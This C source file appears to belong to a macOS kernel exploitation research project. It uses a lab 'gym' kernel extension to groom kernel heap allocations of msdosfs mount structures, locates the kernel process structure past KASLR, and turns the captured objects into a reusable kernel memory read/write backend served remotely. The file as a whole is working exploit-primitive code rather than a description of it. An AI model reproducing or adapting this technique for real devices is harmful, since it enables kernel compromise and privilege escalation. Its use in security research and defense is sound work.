//
//  main.c
//  kmem_msdosfs
//
//  Created by admin on 11/26/21.
//


#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>
#include <string.h>
#include <signal.h>

#include <sys/errno.h>
#include <sys/fcntl.h>
#include <gym_client.h>

#include "platform_variables.h"
#include "allocator_msdosfs.h"
#include "utils_misc.h"
#include "util_dispatch.h"
#include "kmem_gym.h"
#include "kmem_msdosfs.h"
#include "kmem_remote.h"
#include "xnu_proc.h"
#include "slider.h"


void capture_msdosfs_mount_pair(uintptr_t* ptr1_out, xe_allocator_msdosfs_t* alloc1_out, uintptr_t* ptr2_out, xe_allocator_msdosfs_t* alloc2_out) {
    size_t count = 2;
    
    slot_id_t slots[count];
    int error = gym_multi_alloc_mem(TYPE_MSDOSFSMOUNT_SIZE, slots, XE_ARRAY_SIZE(slots));
    assert(error == 0);
    
    uintptr_t addrs[count];
    error = xe_util_dispatch_apply(addrs, sizeof(addrs[0]), XE_ARRAY_SIZE(addrs), slots, ^(void* ctx, void* data, size_t idx) {
        slot_id_t* slots = (slot_id_t*)ctx;
        uintptr_t* addr = (uintptr_t*)data;
        int error = gym_read_slot_address(slots[idx], addr);
        if (error) {
            return error;
        }
        return gym_destructible_free(*addr);
    });
    
    assert(error == 0);
    
    xe_allocator_msdosfs_t msdosfs_allocators[128];
    bzero(msdosfs_allocators, XE_ARRAY_SIZE(msdosfs_allocators));
    
    error = xe_util_dispatch_apply(msdosfs_allocators, sizeof(msdosfs_allocators[0]), XE_ARRAY_SIZE(msdosfs_allocators), NULL, ^(void* ctx, void* data, size_t idx) {
        char label[64];
        snprintf(label, sizeof(label), "xe_%ld", idx);
        return xe_allocator_msdosfs_create(label, (xe_allocator_msdosfs_t*)data);
    });
    assert(error == 0);
    
    int capture_idxs[count];
    error = xe_util_dispatch_apply(capture_idxs, sizeof(capture_idxs[0]), XE_ARRAY_SIZE(capture_idxs), slots, ^(void* ctx, void* data, size_t idx) {
        slot_id_t* slots = (slot_id_t*)ctx;
        char slot_data[TYPE_MSDOSFSMOUNT_SIZE];
        int error = gym_alloc_read(slots[idx], slot_data, sizeof(slot_data), NULL);
        if (error) {
            return error;
        }
        
        _Bool modified = 0;
        for (int i=0; i<TYPE_MSDOSFSMOUNT_SIZE; i++) {
            if (slot_data[i] != 0) {
                modified = 1;
                break;
            }
        }
        
        if (!modified) {
            return ENOTRECOVERABLE;
        }
        
        char* label = slot_data + TYPE_MSDOSFSMOUNT_MEM_PM_LABEL_OFFSET;
        char* endp;
        
        if (label[0] != 'x' || label[1] != 'e' || label[2] != '_') {
            return ENOTRECOVERABLE;
        }
        
        int capture_idx = (int)strtoul(&label[3], &endp, 10);
        *((int*)data) = capture_idx;
        
        return 0;
    });
    assert(error == 0);
    
    xe_allocator_msdosfs_t captured[count];
    for (int i=0; i<count; i++) {
        captured[i] = msdosfs_allocators[capture_idxs[i]];
    }
    
    error = xe_util_dispatch_apply(msdosfs_allocators, sizeof(msdosfs_allocators[0]), XE_ARRAY_SIZE(msdosfs_allocators), capture_idxs, ^(void* ctx, void* data, size_t idx) {
        int* captured_idxs = (int*)ctx;
        for (int i=0; i<count; i++) {
            if (captured_idxs[i] == idx) {
                return 0;
            }
        }
        return xe_allocator_msdosfs_destroy((xe_allocator_msdosfs_t*)data);
    });
    
    assert(error == 0);
    
    *ptr1_out = addrs[0];
    *ptr2_out = addrs[1];
    *alloc1_out = captured[0];
    *alloc2_out = captured[1];
}

int main(int argc, const char* argv[]) {
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_slider_init();
    xe_allocator_msdosfs_loadkext();
    
    uintptr_t worker_addr, helper_addr;
    xe_allocator_msdosfs_t worker_allocator, helper_allocator;
    capture_msdosfs_mount_pair(&worker_addr, &worker_allocator, &helper_addr, &helper_allocator);
    
    char worker_data_backup[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(worker_data_backup, worker_addr, sizeof(worker_data_backup));
    char helper_data_backup[TYPE_MSDOSFSMOUNT_SIZE];
    xe_kmem_read(helper_data_backup, helper_addr, sizeof(helper_data_backup));
    
    char temp_dir[PATH_MAX] = "/tmp/xe_kmem_XXXXXXX";
    assert(mkdtemp(temp_dir) != NULL);
    
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/worker_bridge", temp_dir);
    int worker_bridge_fd = open(path, O_CREAT | O_RDWR);
    assert(worker_bridge_fd >= 0);
    
    snprintf(path, sizeof(path), "%s/helper_bridge", temp_dir);
    int helper_bridge_fd = open(path, O_CREAT | O_RDWR);
    assert(helper_bridge_fd >= 0);
    
    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
    uintptr_t proc;
    int error = xe_xnu_proc_current_proc(kernproc, &proc);
    assert(error == 0);
    
    uintptr_t worker_bridge_vnode;
    error = xe_xnu_proc_find_fd_data(proc, worker_bridge_fd, &worker_bridge_vnode);
    assert(error == 0);
    
    uintptr_t helper_bridge_vnode;
    error = xe_xnu_proc_find_fd_data(proc, helper_bridge_fd, &helper_bridge_vnode);
    assert(error == 0);
    
    struct kmem_msdosfs_init_args args;
    xe_kmem_read(args.worker_data, worker_addr, sizeof(args.worker_data));
    args.worker_msdosfs = worker_addr;
    args.worker_bridge_fd = worker_bridge_fd;
    args.worker_bridge_vnode = worker_bridge_vnode;
    xe_allocator_msdosfs_get_mountpoint(worker_allocator, args.worker_mount_point, sizeof(args.worker_mount_point));
    
    xe_kmem_read(args.helper_data, helper_addr, sizeof(args.helper_data));
    args.helper_msdosfs = helper_addr;
    args.helper_bridge_fd = helper_bridge_fd;
    args.helper_bridge_vnode = helper_bridge_vnode;
    xe_allocator_msdosfs_get_mountpoint(helper_allocator, args.helper_mount_point, sizeof(args.helper_mount_point));
    args.helper_mutator = ^(void* ctx, char data[TYPE_MSDOSFSMOUNT_SIZE]) {
        xe_kmem_write(helper_addr, data, TYPE_MSDOSFSMOUNT_SIZE);
    };
    args.helper_mutator_ctx = NULL;
    
    struct xe_kmem_backend* msdosfs_backend = xe_kmem_msdosfs_create(&args);
    xe_kmem_use_backend(msdosfs_backend);
    xe_kmem_remote_server_start();
    
    printf("[INFO] stopping server\n");
    xe_kmem_use_backend(xe_kmem_gym_create());
    xe_kmem_msdosfs_destroy(msdosfs_backend);
    
    xe_kmem_write(worker_addr, worker_data_backup, sizeof(worker_data_backup));
    xe_kmem_write(helper_addr, helper_data_backup, sizeof(helper_data_backup));
    
    xe_allocator_msdosfs_destroy(&worker_allocator);
    xe_allocator_msdosfs_destroy(&helper_allocator);
    
    close(worker_bridge_fd);
    close(helper_bridge_fd);
    rmdir(temp_dir);
    
    return 0;
}
